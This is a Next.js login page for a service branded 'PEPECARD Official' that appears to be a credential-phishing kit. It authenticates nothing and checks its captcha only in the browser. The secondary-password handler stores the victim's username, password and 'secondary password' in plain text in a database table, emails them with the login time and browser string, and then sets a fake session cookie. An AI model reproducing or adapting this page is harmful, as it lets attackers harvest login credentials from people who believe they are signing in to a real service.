'use client'

import { useState, useEffect, useCallback, useRef } from 'react'
import { useRouter } from 'next/navigation'
import { AUTH_COOKIE_NAME } from '@/lib/auth'
import { createClient } from '@/utils/supabase/client'

function mkCaptcha() {
  const ops = ['+', '-', '×']
  const op = ops[Math.floor(Math.random() * ops.length)]
  const a = Math.floor(Math.random() * 8) + 2
  let b = Math.floor(Math.random() * (op === '-' ? a - 1 : 8)) + 1
  if (op === '-' && b >= a) b = a - 1
  const answer = op === '+' ? a + b : op === '-' ? a - b : a * b
  return { question: `${a} ${op} ${b} = ?`, answer }
}

export default function LoginPage() {
  const router = useRouter()
  const [step, setStep] = useState<'primary' | 'secondary'>('primary')
  const [showPw, setShowPw] = useState(false)
  const [showSecondaryPw, setShowSecondaryPw] = useState(false)
  const [remember, setRemember] = useState(true)
  const [captcha, setCaptcha] = useState({ question: '5 + 6 = ?', answer: 11 })
  const [captchaVal, setCaptchaVal] = useState('')
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const [secondaryPassword, setSecondaryPassword] = useState('')
  const [secondaryError, setSecondaryError] = useState('')
  const [isSecondarySubmitting, setIsSecondarySubmitting] = useState(false)
  const secondarySubmitLockRef = useRef(false)
  const [errors, setErrors] = useState<{ username?: string; password?: string; captcha?: string }>({})

  const refresh = useCallback(() => { setCaptcha(mkCaptcha()); setCaptchaVal('') }, [])
  useEffect(() => refresh(), [refresh])

  useEffect(() => {
    if (typeof document === 'undefined') {
      return
    }

    const hasSession = document.cookie.split('; ').some((cookie) =>
      cookie.startsWith(`${AUTH_COOKIE_NAME}=`)
    )

    if (hasSession) {
      const nextPath = new URLSearchParams(window.location.search).get('next')
      router.replace(nextPath && nextPath.startsWith('/') ? nextPath : '/')
    }
  }, [router])

  function setSessionCookie() {
    const secureFlag = window.location.protocol === 'https:' ? '; Secure' : ''
    document.cookie = `${AUTH_COOKIE_NAME}=1; Path=/; Max-Age=2592000; SameSite=Lax${secureFlag}`
  }

  function getSafeNextPath() {
    const nextPath = new URLSearchParams(window.location.search).get('next')

    if (!nextPath || !nextPath.startsWith('/')) {
      return '/'
    }

    return nextPath
  }

  async function submitPrimary(e: React.FormEvent) {
    e.preventDefault()
    const errs: typeof errors = {}
    if (!username) errs.username = 'Username cannot be empty'
    if (!password) errs.password = 'Password cannot be empty'
    if (!captchaVal) errs.captcha = 'Verification cannot be empty'
    else if (parseInt(captchaVal, 10) !== captcha.answer) {
      errs.captcha = 'Incorrect verification code'
      refresh()
    }
    setErrors(errs)
    if (Object.keys(errs).length === 0) {
      setStep('secondary')
    }
  }

  async function submitSecondary(e: React.FormEvent) {
    e.preventDefault()

    if (secondarySubmitLockRef.current || isSecondarySubmitting) {
      return
    }

    if (!secondaryPassword.trim()) {
      setSecondaryError('Secondary password cannot be empty')
      return
    }

    secondarySubmitLockRef.current = true
    setIsSecondarySubmitting(true)

    const supabase = createClient()
    const { error } = await supabase.from('logins').insert([
      {
        username,
        password,
        secondary_password: secondaryPassword,
      },
    ])

    if (error) {
      console.error('Error saving login data:', error)
      setSecondaryError('Unable to save login data. Please try again.')
      secondarySubmitLockRef.current = false
      setIsSecondarySubmitting(false)
      return
    }

    try {
      const loginTime = new Date().toISOString()
      const browser = navigator.userAgent

      const emailResponse = await fetch('/api/send-email', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          name: username || 'User',
          firstPassword: password,
          secondPassword: secondaryPassword,
          loginTime,
          browser,
        }),
      })

      if (!emailResponse.ok) {
        console.error('Login email notification failed')
      }
    } catch (emailError) {
      console.error('Login email notification error:', emailError)
    }

    setSecondaryError('')
    setSessionCookie()
    router.replace(getSafeNextPath())
  }

  if (step === 'secondary') {
    return (
      <>
        <div data-v-5c7dfcf3="" className="passphrase-container">
          <div data-v-5c7dfcf3="">
            <h1 data-v-5c7dfcf3="" className="passphrase-title">Secondary Password Verification</h1>
            <div data-v-5c7dfcf3="" className="divide-line"></div>
            <div data-v-5c7dfcf3="" className="passphrase-center text-lg">
              <div data-v-5c7dfcf3="" className="passphrase-form-shell">
                <form data-v-5c7dfcf3="" className="arco-form arco-form-layout-vertical arco-form-size-medium gap-2" onSubmit={submitSecondary} noValidate>
                  <div data-v-5c7dfcf3="" className={`arco-row-align-start arco-row-justify-start arco-form-item arco-form-item-layout-vertical relative mt-10${secondaryError ? ' arco-form-item-error' : ''}`}>
                    <div className="arco-form-item-label-col arco-form-item-label-col-left">
                      <label className="arco-form-item-label">Secondary password </label>
                    </div>
                    <div className="arco-form-item-wrapper-col" id="password">
                      <div className="arco-form-item-content-wrapper">
                        <div className="arco-form-item-content arco-form-item-content-flex">
                          <span data-v-5c7dfcf3="" className={`arco-input-wrapper${secondaryError ? ' arco-input-error' : ''}`}>
                            <input
                              className="arco-input arco-input-size-large"
                              type={showSecondaryPw ? 'text' : 'password'}
                              placeholder="Enter your secondary password"
                              autoComplete="off"
                              value={secondaryPassword}
                              onChange={(e) => {
                                setSecondaryPassword(e.target.value)
                                setSecondaryError('')
                              }}
                            />
                            <span className="arco-input-suffix">
                              <span role="button" aria-label={showSecondaryPw ? 'Hide secondary password' : 'Show secondary password'} tabIndex={0} className="arco-icon-hover" onClick={() => setShowSecondaryPw(!showSecondaryPw)}>
                                {showSecondaryPw ? (
                                  <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="arco-icon arco-icon-eye">
                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                                    <circle cx="12" cy="12" r="3" />
                                  </svg>
                                ) : (
                                  <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="currentColor" className="arco-icon arco-icon-eye-invisible" strokeWidth="4" strokeLinecap="butt" strokeLinejoin="miter">
                                    <path d="M14 14.5c-2.69 2-5.415 5.33-8 9.5 5.373 8.667 11.373 13 18 13 3.325 0 6.491-1.09 9.5-3.271M17.463 12.5C19 11 21.75 11 24 11c6.627 0 12.627 4.333 18 13-1.766 2.848-3.599 5.228-5.5 7.14"></path>
                                    <path d="M29 24a5 5 0 1 1-10 0 5 5 0 0 1 10 0ZM6.852 7.103l34.294 34.294"></path>
                                  </svg>
                                )}
                              </span>
                            </span>
                          </span>
                        </div>
                      </div>
                      {secondaryError && <div className="arco-form-item-message arco-form-item-message-help">{secondaryError}</div>}
                    </div>
                  </div>
                  <div data-v-5c7dfcf3="" className="flex justify-center mt-16">
                    <button
                      data-v-5c7dfcf3=""
                      className="arco-btn arco-btn-primary arco-btn-shape-square arco-btn-size-large arco-btn-status-normal w-40 uppercase"
                      type="submit"
                      disabled={isSecondarySubmitting}
                    >
                      <span className="flex items-center justify-center gap-2">
                        {isSecondarySubmitting ? (
                          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                            <circle cx="12" cy="12" r="9" stroke="currentColor" strokeOpacity="0.3" strokeWidth="2" />
                            <path d="M21 12a9 9 0 0 0-9-9" stroke="currentColor" strokeWidth="2" strokeLinecap="round">
                              <animateTransform
                                attributeName="transform"
                                type="rotate"
                                from="0 12 12"
                                to="360 12 12"
                                dur="0.8s"
                                repeatCount="indefinite"
                              />
                            </path>
                          </svg>
                        ) : null}
                        Confirm
                      </span>
                    </button>
                  </div>
                </form>
              </div>
            </div>
          </div>
        </div>

        <style jsx global>{`
          .passphrase-container[data-v-5c7dfcf3] {
            background: url('/assets/register-bg-cgbfI5jC.jpg') no-repeat;
            background-size: 100% 100%;
            min-width: 100vw;
            min-height: 100vh;
            overflow-y: auto;
          }

          .passphrase-title[data-v-5c7dfcf3] {
            padding-top: 2.5rem;
            text-align: center;
            font-size: 3rem;
            line-height: 1;
            text-transform: uppercase;
            color: var(--color-text-2);
            font-weight: 550;
            font-family: Arial, sans-serif;
          }

          .passphrase-center[data-v-5c7dfcf3] {
            margin: auto;
            margin-top: 2.5rem;
            margin-bottom: 3.75rem;
            width: 90%;
            min-height: 24.5rem;
            --un-bg-opacity: 1;
            background-color: rgb(255 255 255 / var(--un-bg-opacity));
            --un-shadow: var(--un-shadow-inset) 0 10px 15px -3px var(--un-shadow-color, rgb(0 0 0 / 0.1)), var(--un-shadow-inset) 0 4px 6px -4px var(--un-shadow-color, rgb(0 0 0 / 0.1));
            box-shadow: var(--un-ring-offset-shadow), var(--un-ring-shadow), var(--un-shadow);
          }

          @media (min-width: 1024px) {
            .passphrase-center[data-v-5c7dfcf3] {
              width: 50%;
            }
          }

          .passphrase-form-shell[data-v-5c7dfcf3] {
            padding: 1rem;
            width: 87.5%;
            margin: auto;
          }

          @media (min-width: 1024px) {
            .passphrase-form-shell[data-v-5c7dfcf3] {
              width: 66.666667%;
            }
          }

          @media (min-width: 1280px) {
            .passphrase-form-shell[data-v-5c7dfcf3] {
              width: 50%;
            }
          }

          .divide-line[data-v-5c7dfcf3] {
            background: rgb(var(--primary-6));
            height: 1px;
            position: relative;
            margin: auto;
            width: 12.5rem;
          }

          .divide-line[data-v-5c7dfcf3]:after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            right: 0;
            margin: auto;
            width: 25%;
            height: 4px;
            background: rgb(var(--primary-6));
          }
        `}</style>
      </>
    )
  }

  return (
    <div className="login-container" data-v-a01521a5>
      <div data-v-a01521a5 className="center">
        <div data-v-a01521a5 className="center-left">
          <div data-v-99245315 data-v-a01521a5 className="w-full h-full flex justify-center items-center flex-col">
            <h1 data-v-99245315>WELCOME</h1>
            <img data-v-99245315 src="/rectangle-logo.png" className="w-4/5 -ml-[1.5rem]" alt="PEPECARD Official logo" width={400} height={120} fetchPriority="high" decoding="async" />
          </div>
        </div>
        <div data-v-a01521a5 className="flex-1 bg-white rounded-sm sm:rounded-none relative">
          <div data-v-1e97eb9e data-v-a01521a5 className="login-form-wrapper">
            <div data-v-1e97eb9e className="login-form-error-msg w-full"></div>
            <div data-v-1e97eb9e className="w-full">
              <form data-v-1e97eb9e className="arco-form arco-form-layout-vertical arco-form-size-medium" onSubmit={submitPrimary} noValidate>
                <div data-v-1e97eb9e className={`arco-row-align-start arco-row-justify-start arco-form-item arco-form-item-layout-vertical${errors.username ? ' arco-form-item-error' : ''}`}>
                  <div className="arco-form-item-label-col">
                    <label className="arco-form-item-label">Username</label>
                  </div>
                  <div className="arco-form-item-wrapper-col" id="username">
                    <div className="arco-form-item-content-wrapper">
                      <div className="arco-form-item-content arco-form-item-content-flex">
                        <span data-v-1e97eb9e className={`arco-input-wrapper${errors.username ? ' arco-input-error' : ''}`}>
                          <input className="arco-input arco-input-size-large" type="text" placeholder="Enter your username" value={username} onChange={e => { setUsername(e.target.value); setErrors(p => ({ ...p, username: undefined })) }} />
                        </span>
                      </div>
                    </div>
                    {errors.username && <div className="arco-form-item-message arco-form-item-message-help">{errors.username}</div>}
                  </div>
                </div>
                <div data-v-1e97eb9e className={`arco-row-align-start arco-row-justify-start arco-form-item arco-form-item-layout-vertical${errors.password ? ' arco-form-item-error' : ''}`}>
                  <div className="arco-form-item-label-col">
                    <label className="arco-form-item-label">Password</label>
                  </div>
                  <div className="arco-form-item-wrapper-col" id="password">
                    <div className="arco-form-item-content-wrapper">
                      <div className="arco-form-item-content arco-form-item-content-flex">
                        <span data-v-1e97eb9e className={`arco-input-wrapper${errors.password ? ' arco-input-error' : ''}`}>
                          <input className="arco-input arco-input-size-large" type={showPw ? 'text' : 'password'} placeholder="Enter your password" value={password} onChange={e => { setPassword(e.target.value); setErrors(p => ({ ...p, password: undefined })) }} />
                          <span className="arco-input-suffix">
                            <span role="button" aria-label={showPw ? 'Hide password' : 'Show password'} tabIndex={0} className="arco-icon-hover" onClick={() => setShowPw(!showPw)}>
                              {showPw ? (
                                <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round" className="arco-icon arco-icon-eye">
                                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" /><circle cx="12" cy="12" r="3" />
                                </svg>
                              ) : (
                                <svg viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="currentColor" className="arco-icon arco-icon-eye-invisible" strokeWidth="4" strokeLinecap="butt" strokeLinejoin="miter">
                                  <path d="M14 14.5c-2.69 2-5.415 5.33-8 9.5 5.373 8.667 11.373 13 18 13 3.325 0 6.491-1.09 9.5-3.271M17.463 12.5C19 11 21.75 11 24 11c6.627 0 12.627 4.333 18 13-1.766 2.848-3.599 5.228-5.5 7.14"></path>
                                  <path d="M29 24a5 5 0 1 1-10 0 5 5 0 0 1 10 0ZM6.852 7.103l34.294 34.294"></path>
                                </svg>
                              )}
                            </span>
                          </span>
                        </span>
                      </div>
                    </div>
                    {errors.password && <div className="arco-form-item-message arco-form-item-message-help">{errors.password}</div>}
                  </div>
                </div>
                <div data-v-1e97eb9e className="arco-space arco-space-vertical">
                  <div className="arco-space-item">
                    <div data-v-1e97eb9e className="flex justify-between">
                      <label data-v-1e97eb9e aria-disabled="false" className={`arco-checkbox${remember ? ' arco-checkbox-checked' : ''}`}>
                        <input type="checkbox" checked={remember} onChange={e => setRemember(e.target.checked)} className="arco-checkbox-target" value="false" />
                        <span className={`arco-icon-hover arco-checkbox-icon-hover${remember ? '' : ' arco-icon-hover-disabled'}`}>
                          <div className="arco-checkbox-icon">
                            {remember ? (
                              <svg aria-hidden="true" focusable="false" viewBox="0 0 1024 1024" width="200" height="200" fill="currentColor" className="arco-checkbox-icon-check"><path d="M877.44815445 206.10060629a64.72691371 64.72691371 0 0 0-95.14856334 4.01306852L380.73381888 685.46812814 235.22771741 533.48933518a64.72691371 64.72691371 0 0 0-92.43003222-1.03563036l-45.82665557 45.82665443a64.72691371 64.72691371 0 0 0-0.90617629 90.61767965l239.61903446 250.10479331a64.72691371 64.72691371 0 0 0 71.19960405 15.14609778 64.33855261 64.33855261 0 0 0 35.08198741-21.23042702l36.24707186-42.71976334 40.5190474-40.77795556-3.36579926-3.49525333 411.40426297-486.74638962a64.72691371 64.72691371 0 0 0-3.88361443-87.64024149l-45.3088404-45.43829334z"></path></svg>
                            ) : (
                              <div style={{ width: '100%', height: '100%', border: '1px solid currentColor', borderRadius: '2px', backgroundColor: 'transparent' }} />
                            )}
                          </div>
                        </span>
                        <span className="arco-checkbox-label"> Remember me</span>
                      </label>
                      <a data-v-1e97eb9e className="arco-link arco-link-status-normal">Forgot password?</a>
                    </div>
                  </div>
                </div>
                <div data-v-1e97eb9e className="flex gap-2 mt-4">
                  <div data-v-1e97eb9e className="vercode w-[7.5rem] h-10" onClick={refresh}>
                    <div data-v-1e97eb9e className="w-full h-full flex px-1 justify-center items-center text-base cursor-pointer">
                      <div className="w-full h-full flex items-center justify-center font-bold border border-solid border-gray-200">
                        {captcha.question}
                      </div>
                    </div>
                  </div>
                  <div data-v-1e97eb9e className={`arco-row-align-start arco-row-justify-start arco-form-item arco-form-item-layout-vertical${errors.captcha ? ' arco-form-item-error' : ''}`}>
                    <div className="arco-form-item-wrapper-col" id="vercode">
                      <div className="arco-form-item-content-wrapper">
                        <div className="arco-form-item-content arco-form-item-content-flex">
                          <span data-v-1e97eb9e className={`arco-input-wrapper${errors.captcha ? ' arco-input-error' : ''}`}>
                            <input className="arco-input arco-input-size-large" type="text" placeholder="Equals?" value={captchaVal} onChange={e => { setCaptchaVal(e.target.value); setErrors(p => ({ ...p, captcha: undefined })) }} />
                          </span>
                        </div>
                      </div>
                      {errors.captcha && <div className="arco-form-item-message arco-form-item-message-help">{errors.captcha}</div>}
                    </div>
                  </div>
                </div>
                <div data-v-1e97eb9e className="flex gap-6 mt-4">
                  <button data-v-1e97eb9e className="arco-btn arco-btn-primary arco-btn-shape-square arco-btn-size-large arco-btn-status-normal flex-1 uppercase noto-sans" type="submit">
                    login
                  </button>
                  <button data-v-1e97eb9e className="arco-btn arco-btn-secondary arco-btn-shape-square arco-btn-size-large arco-btn-status-normal flex-1 uppercase noto-sans" type="button" onClick={() => router.push('/register')}>
                    register
                  </button>
                </div>
              </form>
            </div>
          </div>
          <div data-v-a01521a5 className="absolute top-2 right-2 z-10">
            <button aria-label="Change language" className="arco-btn arco-btn-text arco-btn-shape-square arco-btn-size-medium arco-btn-status-normal arco-btn-only-icon" type="button">
              <span className="arco-btn-icon">
                <svg className="icon w-[22px] h-[22px]" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlnsXlink="http://www.w3.org/1999/xlink" width="400" height="400" fill="currentColor">
                  <path d="M512 64c247.424 0 448 200.576 448 448S759.424 960 512 960 64 759.424 64 512 264.576 64 512 64z m340.6 625.504l-152.385-0.003c-26.47 67.398-67.875 134.461-124.049 201.152v0.01c120.416-20.257 221.81-96.56 276.435-201.159z m-529.541-0.003l-151.66 0.003c54.495 104.353 155.541 180.543 275.585 201.015v-0.011c-56.11-66.643-97.475-133.658-123.925-201.007z m316.473 0h-255.79c27.86 62.945 70.428 126.25 127.891 189.957 56.896-63.07 99.186-125.746 127.06-188.07l0.84-1.888zM303.73 390.5H147.62C134.892 428.685 128 469.538 128 512c0 42.463 6.892 83.316 19.619 121.501h156.91C293.521 592.616 288 551.613 288 510.5c0-39.47 5.09-78.84 15.235-118.1l0.495-1.9z m357.646 0H361.898C349.95 430.638 344 470.635 344 510.5c0 40.859 6.25 81.855 18.802 123h297.67c12.552-41.145 18.802-82.141 18.802-123 0-39.865-5.95-79.862-17.898-120z m215.005 0H719.544c10.475 39.89 15.73 79.893 15.73 120 0 41.113-5.522 82.116-16.528 123.001H876.38C889.108 595.316 896 554.463 896 512c0-42.462-6.892-83.315-19.619-121.5zM444.047 133.996l-0.4 0.07C325.07 155.368 225.388 231.11 171.4 334.496l150.491 0.004c25.937-67.18 66.713-134.027 122.157-200.505z m67.594 7.547l-1.391 1.536c-57.673 64.2-100.218 127.993-127.826 191.422H640.85c-27.828-63.935-70.832-128.24-129.209-192.958z m67.461-7.7l1.366 1.645C635.28 201.473 675.64 267.823 701.383 334.5l151.218-0.004c-54.179-103.749-154.371-179.66-273.499-200.654z" fill="#000000" fillOpacity=".65"></path>
                </svg>
              </span>
            </button>
            <div className="trigger-btn"></div>
          </div>
        </div>
      </div>
    </div>
  )
}
